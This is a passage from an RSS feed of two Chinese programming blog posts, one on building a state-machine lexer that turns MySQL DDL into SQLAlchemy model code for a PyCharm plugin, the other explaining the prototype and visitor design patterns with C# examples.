&lt;p&gt;考虑到我们主要是用 &lt;code&gt;PyCharm&lt;/code&gt; 开发，正好 &lt;code&gt;jetbrains&lt;/code&gt; 也提供了 &lt;code&gt;SDK&lt;/code&gt; 用于开发插件，所以 &lt;code&gt;UI&lt;/code&gt; 层面可以不用额外考虑了。&lt;/p&gt;
&lt;p&gt;使用流程很简单，只需要导入 &lt;code&gt;DDL&lt;/code&gt; 语句就可以生成 &lt;code&gt;Python&lt;/code&gt; 所需要的 &lt;code&gt;Model&lt;/code&gt; 代码。&lt;/p&gt;
&lt;p&gt;例如导入以下 DDL：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userName` varchar(20) DEFAULT NULL COMMENT '用户名',
  `password` varchar(100) DEFAULT NULL COMMENT '密码',
  `roleId` int(11) DEFAULT NULL COMMENT '角色ID',
  PRIMARY KEY (`id`),  
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;便会生成对应的 Python 代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;class User(db.Model):
    __tablename__ = 'user'
    id = db.Column(db.Integer, primary_key=True, autoincrement=True)
    userName = db.Column(db.String)  # 用户名
    password = db.Column(db.String)  # 密码
    roleId = db.Column(db.Integer)  # 角色ID
&lt;/code&gt;
&lt;/pre&gt;

&lt;p&gt;仔细对比源文件及目标代码会很容易找出规律，无非就是解析出表名、字段、及字段的属性（是否为主键、类型、长度），最后再转换为 &lt;code&gt;Python&lt;/code&gt; 所需要的模板即可。&lt;/p&gt;
&lt;p&gt;在我动手之前我认为是非常简单的，无非就是解析字符串，但实际上手后发现不是那么回事；主要是有以下几个问题：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;如何识别出表名称？&lt;/li&gt;
&lt;li&gt;同样的如何识别出字段名称，同时还得关联上该字段的类型、长度、注释。&lt;/li&gt;
&lt;li&gt;如何识别出主键？&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;总结一句话，如何通过一系列规则识别出一段字符串中的关键信息，这同样也是 MySQL Server 所做的事情。&lt;/p&gt;
&lt;p&gt;在开始真正解析 DDL 之前，先来看下一段简单的脚本如何解析：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;x = 20
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;按照我们平时开发的经验，这条语句分为以下几部分：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;x&lt;/code&gt; 表示变量&lt;/li&gt;
&lt;li&gt;&lt;code&gt;=&lt;/code&gt; 表示赋值符号&lt;/li&gt;
&lt;li&gt;&lt;code&gt;20&lt;/code&gt; 表示赋值结果&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;所以我们对这段脚本的解析结果应当为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;VAR   x
GE          =
VAL      100
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这个解析过程在编译原理中称为”词法解析“，可能大家听到&lt;code&gt;编译原理&lt;/code&gt;这几个字就头大（我也是）；对于刚才那段脚本我们可以编写一个非常简单的词法解析器生成这样的结果。&lt;/p&gt;
&lt;h2 id=&quot;状态迁移&quot;&gt;状态迁移&lt;/h2&gt;
&lt;p&gt;再开始之前先捋一下思路，可以看到上文的结果中通过 &lt;code&gt;VAR&lt;/code&gt; 表示变量、&lt;code&gt;GE&lt;/code&gt; 表示赋值符号 ”=“、&lt;code&gt;VAL&lt;/code&gt; 表示赋值结果，现在需要重点记住这三个状态。&lt;/p&gt;
&lt;p&gt;在依次读取字符解析时，程序就是在这几个状态中来回切换，如下图：&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/XPcKbDVUNsSeGM9.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;默认为初始状态。&lt;/li&gt;
&lt;li&gt;当字符为字母时进入 &lt;code&gt;VAR&lt;/code&gt; 状态。&lt;/li&gt;
&lt;li&gt;当字符为 ”=“ 符号时进入 &lt;code&gt;GE&lt;/code&gt; 状态。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/3mRvj4O1y8EgPNu.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;同理，当不满足这几个状态时候又会回到初始从而再次确认新的状态。&lt;/p&gt;
&lt;p&gt;光看图有点抽象，直接来看核心代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;    public class Result{
        public TokenType tokenType ;
        public StringBuilder text = new StringBuilder();
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先定义了一个结果类，收集最终的解析结果；其中的 &lt;code&gt;TokenType&lt;/code&gt; 就对应了图中的三种状态，简单的用枚举值来表示。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public enum TokenType {
    INIT,
    VAR,
    GE,
    VAL
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;首先对应到第一张图：初始化状态。&lt;/p&gt;
&lt;p&gt;需要对当前解析的字符定义一个 &lt;code&gt;TokenType&lt;/code&gt;：&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/3WU5vyiGF1eCq47.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;和图中描述的流程一致，判断当前字符给定一个状态即可。&lt;/p&gt;
&lt;p&gt;接着对应到第二张图：状态之间的转换。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/BXqdW1JPMj59yTG.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;会根据不同的状态进入不同的 &lt;code&gt;case&lt;/code&gt;，在不同的 &lt;code&gt;case&lt;/code&gt; 中判断是否应当跳转到其他状态（进入 &lt;code&gt;INIT&lt;/code&gt; 状态后会重新生成状态）。&lt;/p&gt;
&lt;p&gt;举个例子： &lt;code&gt;x = 20&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;首选会进入 &lt;code&gt;VAR&lt;/code&gt; 状态，接着下一个字符为空格，自然在 38 行中重新进入初始状态，导致再次确定下一个字符 &lt;code&gt;=&lt;/code&gt; 进入 &lt;code&gt;GE&lt;/code&gt; 状态。&lt;/p&gt;
&lt;p&gt;当脚本为 &lt;code&gt;ab = 30&lt;/code&gt;:&lt;br/&gt;第一个字符为 a 也是进入 &lt;code&gt;VAR&lt;/code&gt; 状态，第二个字符为 b，依然为字母，所以进入 36 行，状态不会改变，同时将 b 这个字符追加进来；后续步骤就和上一个例子一致了。&lt;/p&gt;
&lt;p&gt;多说无益，建议大家自己跑一下单测就会明白：&lt;br/&gt;&lt;a href=&quot;https://github.com/crossoverJie/sqlalchemy-transfer/blob/master/src/test/java/top/crossoverjie/plugin/core/lab/TestLexerTest.java&quot;&gt;https://github.com/crossoverJie/sqlalchemy-transfer/blob/master/src/test/java/top/crossoverjie/plugin/core/lab/TestLexerTest.java&lt;/a&gt;&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/xvB3uJAPm8tsDSF.jpg&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/EDNnAXGTJRbmkij.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;ddl-解析&quot;&gt;DDL 解析&lt;/h2&gt;
&lt;p&gt;简单的解析完成后来看看 &lt;code&gt;DDL&lt;/code&gt; 这样的脚本应当如何解析：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;CREATE TABLE `user` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `userName` varchar(20) DEFAULT NULL COMMENT '用户名',
  `password` varchar(100) DEFAULT NULL COMMENT '密码',
  `roleId` int(11) DEFAULT NULL COMMENT '角色ID',
  PRIMARY KEY (`id`),  
) ENGINE=InnoDB AUTO_INCREMENT=7 DEFAULT CHARSET=utf8
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;原理类似，首先还是要看出规律（也就是语法）：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;表名是第一行语句，同时以 &lt;code&gt;CREATE TABLE&lt;/code&gt; 开头。&lt;/li&gt;
&lt;li&gt;每一个字段的信息（名称、类型、长度、备注）都是以 &quot;`&quot; 符号开头 &quot;,&quot; 结尾。&lt;/li&gt;
&lt;li&gt;主键是以 PRIMART 字符串开头的字段，以 &lt;code&gt;)&lt;/code&gt; 结尾。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;根据我们需要解析的数据种类，我这里定义了这个枚举：&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/p1UxCHKNGbDQZ5d.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后在初始化类型时进行判断赋值：&lt;br/&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/mtsRX534r7hpqHy.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由于需要解析的数据不少，所以这里的判断条件自然也就多了。&lt;/p&gt;
&lt;h2 id=&quot;递归解析&quot;&gt;递归解析&lt;/h2&gt;
&lt;p&gt;针对于 &lt;code&gt;DDL&lt;/code&gt; 的语法规则，我们这里还有需要有特殊处理的地方；比如解析具体字段信息时如何关联起来？&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;`userName` varchar(20) DEFAULT NULL COMMENT '用户名',
`password` varchar(100) DEFAULT NULL COMMENT '密码',
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这里我们解析出来的数据得有一个映射关系：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/MHdbTgSY5IELwQc.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以我们只能一个字段的全部信息解析完成并且关联好之后才能解析下一个字段。&lt;/p&gt;
&lt;p&gt;于是这里我采用了递归的方式进行解析（不一定是最好的，欢迎大家提出更优的方案）。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;} else if (value == '`' &amp;amp;&amp;amp; pStatus == Status.BASE_INIT) {
    result.tokenType = DDLTokenType.FI;
    result.text.append(value);
} 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当当前字符为 ”`“ 符号时，将状态置为 &quot;FI&quot;(FieldInfo)，同时当解析到为 &quot;,&quot; 符号时便进入递归处理。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/bDYsyUZB3cwLHu6.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以理解为将这一段字符串单独提取出来处理：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;`userName` varchar(20) DEFAULT NULL COMMENT '用户名',
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接着再将这段字符递归调用当前方法再次进行解析，这时便按照字段名称、类型、长度、注释的规则解析即可。&lt;/p&gt;
&lt;p&gt;同时既然存在递归，还需要将子递归的数据关联起来，所以我在返回结果中新增了一个 &lt;code&gt;pid&lt;/code&gt; 的字段，这个也容易理解。&lt;/p&gt;
&lt;p&gt;默认值为 0，一旦递归后便自增 +1，保证每次递归的数据都是唯一的。&lt;/p&gt;
&lt;p&gt;用同样的方法在解析主键时也是先将整个字符串提取出来:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-sql&quot;&gt;PRIMARY KEY (`id`)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;只不过是 &quot;P&quot; 打头 &quot;)&quot; 结尾。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;} else if (value == 'P' &amp;amp;&amp;amp; pStatus == Status.BASE_INIT) {
    result.tokenType = DDLTokenType.P_K;
    result.text.append(value);
} 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/MYVlc4Sb9LovH2z.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;也是将整段字符串递归解析，再递归的过程中进行状态切换 &lt;code&gt;P_K ---&amp;gt; P_K_V&lt;/code&gt; 最终获取到主键。&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/qRkbKrH9IWtVnw1.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;所以通过对刚才那段 &lt;code&gt;DDL&lt;/code&gt; 解析得到的结果如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/k3GCZe1sKujtbrp.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这样每个字段也通过了 &lt;code&gt;pid&lt;/code&gt; 进行了区分关联。&lt;/p&gt;
&lt;p&gt;所以现在只需要对这个词法解析器进行封装，便可以提供一个简单的 &lt;code&gt;API&lt;/code&gt; 来获取表中的数据了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/1V8vsNFdxMLiRlY.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;到此整个词法解析器的全部内容都已经完成了，虽然实现的是一个小功能，但我自己花的时间可不少，其中光复习编译原理就让人头疼。&lt;/p&gt;
&lt;p&gt;但这还只是整个编译语言知识点的冰山一角，后续还有语法、语义、中间、目标代码等一系列内容，都是一个比一个难啃。&lt;/p&gt;
&lt;p&gt;其实我相信大多数人和我想法一样，这个东西太底层而且枯燥，真正从事这方面工作的也都是凤毛麟角，所以花这时间干啥呢？&lt;/p&gt;
&lt;p&gt;所以我也决定这个弄完后就弃坑啦。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/03/23/6bTSWEcxzaykX9N.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p&gt;哈哈，开个玩笑，或许有生之年自己也能实现一门编程语言，当老了和儿子吹牛时也能有点资本。&lt;/p&gt;
&lt;p&gt;本文所有源码及插件地址：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/crossoverJie/sqlalchemy-transfer&quot;&gt;https://github.com/crossoverJie/sqlalchemy-transfer&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;大家看完记得点赞分享一键三连哦&lt;/strong&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 23 Mar 2020 00:34:00 +0000</pubDate>
<dc:creator>crossoverJie</dc:creator>
<og:description>前言 最近大部分时间都在撸 ，其中也会涉及到将数据库表转换为 中 框架的 ，但我们并没有找到一个合适的工具来做这个意义不大的”体力活“，所以每次新建表后大家都是根据自己的表结构手写一遍 。 一两张表还</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/crossoverJie/p/12549820.html</dc:identifier>
</item>
<item>
<title>Head First设计模式——原型模式和访问者模式  - Spring2Sun</title>
<link>http://www.cnblogs.com/SunSpring/p/12507777.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/SunSpring/p/12507777.html</guid>
<description>&lt;h2&gt;原型&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;原型模式：当创建给定类的过程很昂贵或很复杂时，就使用原型模式。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;我们在进行游戏的时候游戏会动态创建怪，而怪时根据场景的不同而变化创建的，英雄自己也会创建一些随从。创建各式各样的怪兽实例，已经越来越麻烦，将各种状态细节放再构造器中，看起来一点都不内聚。如果能够在单一区域内封装所有的实例化细节，能够将负责处理创建怪兽的细节代码，从实际需要动态创建实例的代码中解耦，那么程序将变得相当干净。&lt;/p&gt;
&lt;p&gt;原型模式通过复制现有的实例来创建新的实例，通常使用clone方法，或者反序列化。&lt;/p&gt;
&lt;p&gt;设计类图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/993045/202003/993045-20200322141812911-1430895588.png&quot; alt=&quot;&quot; width=&quot;1164&quot; height=&quot;464&quot;/&gt;&lt;/p&gt;
&lt;p&gt;原型模式中有三个角色：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;原型角色&lt;/strong&gt;：定义用于复制现有实例来生成新实例的方法(Monster)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;具体原型角色&lt;/strong&gt;：实现用于复制现有实例来生成新实例的方法(WellKnowMonster，DynamicGeneratedMonster)。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;使用者角色&lt;/strong&gt;：维护一个注册表，并提供一个找出正确实例原型的方法。最后，提供一个获取新实例的方法，用来委托复制实例的方法生成新实例。&lt;/p&gt;
&lt;p&gt;实现代码：&lt;/p&gt;
&lt;p&gt;①原型角色&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; Monster
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt;3&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Monster Clone();
&lt;/span&gt;&lt;span&gt;4&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;②具体原型角色&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; WellKnowMonster : Monster
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Monster Clone()
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;        {
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt;             Monster clone = JsonConvert.DeserializeObject&amp;lt;WellKnowMonster&amp;gt;(JsonConvert.SerializeObject(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; clone;
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; 
&lt;span&gt;10&lt;/span&gt; 
&lt;span&gt;11&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DynamicGeneratedMonster : Monster
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt;&lt;span&gt; Monster Clone()
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        {
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt;             Monster clone = JsonConvert.DeserializeObject&amp;lt;DynamicGeneratedMonster&amp;gt;(JsonConvert.SerializeObject(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;));
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt;             &lt;span&gt;return&lt;/span&gt;&lt;span&gt; clone;
&lt;/span&gt;&lt;span&gt;17&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;18&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;③使用者角色&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; MonsterRegistry
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, Monster&amp;gt; monsterDic = &lt;span&gt;new&lt;/span&gt; Dictionary&amp;lt;&lt;span&gt;string&lt;/span&gt;, Monster&amp;gt;&lt;span&gt;();
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; RegisterMonster(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; key,Monster monster) {
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;            monsterDic.Add(key, monster);
&lt;/span&gt;&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt; 7&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; Monster GetMonster(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; key) {
&lt;/span&gt;&lt;span&gt; 8&lt;/span&gt;             Monster monster =&lt;span&gt; monsterDic[key];
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt;              &lt;span&gt;return&lt;/span&gt;&lt;span&gt; monster.Clone();
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;④测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/993045/202003/993045-20200322151339519-2118014411.png&quot; alt=&quot;&quot; width=&quot;1209&quot; height=&quot;529&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 优点：&lt;/p&gt;
&lt;p&gt;1、向客户隐藏制造新实例的复杂性。&lt;/p&gt;
&lt;p&gt;2、提供让客户能够产生未知类型对象的选项。&lt;/p&gt;
&lt;p&gt;3、在某些环境下，复制对象比创建新对象更有效。&lt;/p&gt;
&lt;p&gt;用途和缺点：&lt;/p&gt;
&lt;p&gt;1、在一个复杂的类层次中，当系统必须从许多类型创建新对象时，可以考虑原型。&lt;/p&gt;
&lt;p&gt;2、使用原型模式的缺点，对象的复制有时候相当复杂。&lt;/p&gt;
&lt;h2&gt;访问者&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;&lt;span&gt;访问者模式：当你想要为一个对象的组合增加新的能力，且封装并不重要时，就使用访问者模式。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当餐厅里面来了顾客，可能顾客会询问菜单的信息（比如这个辣不辣，这个味道重不重之类的），甚至有些会询问原材料的成分。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/993045/202003/993045-20200322154931511-469658538.png&quot; alt=&quot;&quot; width=&quot;704&quot; height=&quot;430&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们像这样设计在每个地方加入新方法，如果增加了新方法我们就必须在两个地方加入新方法，万一多了新的菜单我们就必须修改三个地方。这种情况我们就可以使用访问者模式。通过访问者访问组合内的每个元素，收集组合中所有对象的状态。一旦状态被收集了，客户就可以让访问者对状态进行各种操作。当需要新的功能时，只要加强访问者即可。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/993045/202003/993045-20200322160101946-1492789098.png&quot; alt=&quot;&quot; width=&quot;825&quot; height=&quot;414&quot;/&gt;&lt;/p&gt;
&lt;p&gt; 实现代码：&lt;/p&gt;
&lt;p&gt;①实现菜单，菜单项接口定义GetState方法&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; MenuComponent
&lt;/span&gt;&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt; 3&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; GetState(Visitor visitor);
&lt;/span&gt;&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt; 5&lt;/span&gt; 
&lt;span&gt; 6&lt;/span&gt; 
&lt;span&gt; 7&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;菜单&lt;/span&gt;
&lt;span&gt; 8&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Menu : MenuComponent
&lt;/span&gt;&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; displayInfo = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;不辣，口味适中&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;11&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; GetState(Visitor visitor)
&lt;/span&gt;&lt;span&gt;12&lt;/span&gt; &lt;span&gt;        {
&lt;/span&gt;&lt;span&gt;13&lt;/span&gt;             visitor.Visit(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;14&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;15&lt;/span&gt; &lt;span&gt;    }
&lt;/span&gt;&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt;     &lt;span&gt;//&lt;/span&gt;&lt;span&gt;原料&lt;/span&gt;
&lt;span&gt;18&lt;/span&gt;     &lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; Ingredients : MenuComponent
&lt;/span&gt;&lt;span&gt;19&lt;/span&gt; &lt;span&gt;    {
&lt;/span&gt;&lt;span&gt;20&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; displayInfo = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;不辣，偏咸&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;;
&lt;/span&gt;&lt;span&gt;21&lt;/span&gt;         &lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; GetState(Visitor visitor)
&lt;/span&gt;&lt;span&gt;22&lt;/span&gt; &lt;span&gt;        {
&lt;/span&gt;&lt;span&gt;23&lt;/span&gt;             visitor.Visit(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;);
&lt;/span&gt;&lt;span&gt;24&lt;/span&gt; &lt;span&gt;        }
&lt;/span&gt;&lt;span&gt;25&lt;/span&gt;     }
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;②访问者，访问者定义接口以便菜单项使用接口类型&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;interface&lt;/span&gt;&lt;span&gt; Visitor
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Visit(Menu menu);
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Visit(Ingredients ingredients);
    }


    &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt; MenuVisitor : Visitor
    {
        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Visit(Menu menu)
        {
            Console.WriteLine(menu.displayInfo);
        }

        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;void&lt;/span&gt;&lt;span&gt; Visit(Ingredients ingredients)
        {
            Console.WriteLine(ingredients.displayInfo);
        }
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;③测试&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/i-beta/993045/202003/993045-20200322162823684-216862692.png&quot; alt=&quot;&quot; width=&quot;936&quot; height=&quot;572&quot;/&gt;&lt;/p&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;p&gt;1、允许你对组合结构加入新的操作，而无需改变结构本身。&lt;/p&gt;
&lt;p&gt;2、想加入新操作相对容易。&lt;/p&gt;
&lt;p&gt;3、访问者所进行的操作，其代码是集中在一起的。&lt;/p&gt;
&lt;p&gt;用途和缺点：&lt;/p&gt;
&lt;p&gt;1、当采用访问者模式的时候，就会打破组合类的封装。&lt;/p&gt;
&lt;p&gt;2、因为访问模式的加入需要对每个像进行访问，所以对组合结构的改变更加困难。&lt;/p&gt;
</description>
<pubDate>Mon, 23 Mar 2020 00:30:00 +0000</pubDate>
<dc:creator>Spring2Sun</dc:creator>
